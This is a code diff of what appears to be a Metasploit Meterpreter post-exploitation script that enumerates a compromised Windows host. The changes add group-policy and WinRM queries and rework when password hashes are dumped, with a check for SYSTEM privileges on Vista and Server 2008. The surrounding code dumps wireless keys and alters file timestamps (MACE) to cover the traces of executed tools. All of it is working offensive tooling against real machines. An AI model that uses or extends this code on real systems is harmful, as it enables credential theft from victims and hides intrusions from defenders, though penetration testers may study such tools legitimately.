@@ -48,11 +48,14 @@ commands = [
 	'net view /domain',
 	'netsh firewall show config',
 	'tasklist /svc',
-	'tasklist /m'
+	'tasklist /m',
+	'gpresult /SCOPE COMPUTER /Z',
+	'gpresult /SCOPE USER /Z'
 ]
 # Windows 2008 Commands
 win2k8cmd = [
-	'oclist',
+	'servermanagercmd.exe -q',
+	'cscript /nologo winrm get winrm/config',
 ]
 # Commands wich MACE will be changed
 cmdstomp = [
@@ -66,6 +69,7 @@ cmdstomp = [
 	'makecab.exe',
 	'tasklist.exe',
 	'wbem\\wmic.exe',
+	'gpresult.exe'
 ]
 # WMIC Commands that will be executed on the Target
 wmic = [
@@ -97,6 +101,8 @@ vstwlancmd = [
 nonwin2kcmd = [
 	'netsh firewall show config',
 	'tasklist /svc',
+	'gpresult /SCOPE COMPUTER /Z',
+	'gpresult /SCOPE USER /Z',
 	'prnport -l',
 	'prnmngr -g',
 	'tasklist.exe',
@@ -106,6 +112,7 @@ nonwin2kcmd = [
 # Executables not pressent in Windows 2000
 nowin2kexe = [
 	'netsh.exe',
+	'gpresult.exe',
 	'tasklist.exe',
 	'wbem\\wmic.exe',
 ]
@@ -174,6 +181,7 @@ def list_exec(session,cmdlst)
 	tmpout = ""
 	cmdout = ""
 	r=''
+	session.response_timeout=120
 	cmdlst.each do |cmd|
 		begin
 			print_status "\trunning command #{cmd}"
@@ -202,6 +210,7 @@ def wmicexec(session,wmiccmds= nil)
 	windr = ''
 	tmpout = ''
 	windrtmp = ""
+	session.response_timeout=120
 	begin
 		tmp = session.fs.file.expand_path("%TEMP%")
 		wmicfl = tmp + "\\wmictmp.txt"
@@ -478,7 +487,6 @@ def dumpwlankeys(session,pathoflogs,filename)
 		print_status("\tCompressing key into cab file for faster download")
 		r = session.sys.process.execute("cmd.exe /c makecab #{windir}\\wlan#{filename}.reg #{windir}\\wlan#{filename}.cab", nil, {'Hidden' => 'true','Channelized' => true})
 		while(d = r.channel.read)
-			puts d
 			garbage << d
 		end
 		r.channel.close
@@ -498,7 +506,6 @@ def dumpwlankeys(session,pathoflogs,filename)
   	end
 	#Deleting left over files
 	print_status("\tDeleting left over files")
-	puts "cmd.exe /c del #{windir}\\wlan*"
 	#session.sys.process.execute("cmd.exe /c del #{windir}\\wlan*", nil, {'Hidden' => 'true'})
 
 end
@@ -612,24 +619,37 @@ if helpopt != 1
 		filewrt(dest,wmicexec(session,wmic))
 		filewrt(dest,findprogs(session))
 		dumpwlankeys(session,logs,filenameinfo)
+		filewrt(dest,gethash(session))
 	elsif trgtos =~ /(Windows .NET)/
 		filewrt(dest,list_exec(session,commands))
 		filewrt(dest,wmicexec(session,wmic))
 		filewrt(dest,findprogs(session))
+		filewrt(dest,gethash(session))
 	elsif trgtos =~ /(Windows 2008)/
-		filewrt(dest,list_exec(session,commands))
-		filewrt(dest,wmicexec(session,wmic))
-		filewrt(dest,findprogs(session))
+		filewrt(dest,list_exec(session,commands + win2k8cmd))
+		#filewrt(dest,wmicexec(session,wmic))
+		#filewrt(dest,findprogs(session))
+		if (client.sys.config.getuid != "NT AUTHORITY\\SYSTEM")
+			print_line("[-] Not currently running as SYSTEM, not able to dump hashes in Windows 2008 if not System.")
+		else
+			filewrt(dest,gethash(session))
+		end
 	elsif trgtos =~ /(Windows Vista)/
 		filewrt(dest,list_exec(session,commands + vstwlancmd))
 		filewrt(dest,wmicexec(session,wmic))
 		filewrt(dest,findprogs(session))
 		dumpwlankeys(session,logs,filenameinfo)
+		if (client.sys.config.getuid != "NT AUTHORITY\\SYSTEM")
+			print_line("[-] Not currently running as SYSTEM, not able to dump hashes in Windows Vista if not System.")
+		else
+			filewrt(dest,gethash(session))
+		end
 	elsif trgtos =~ /(Windows 2000)/
 		filewrt(dest,list_exec(session,commands - nonwin2kcmd))
+		filewrt(dest,gethash(session))
 	end
 
-	filewrt(dest,gethash(session))
+	#filewrt(dest,gethash(session))
 	filewrt(dest,listtokens(session))
 	if (rd != nil)
 		regdump(session,logs,filenameinfo)
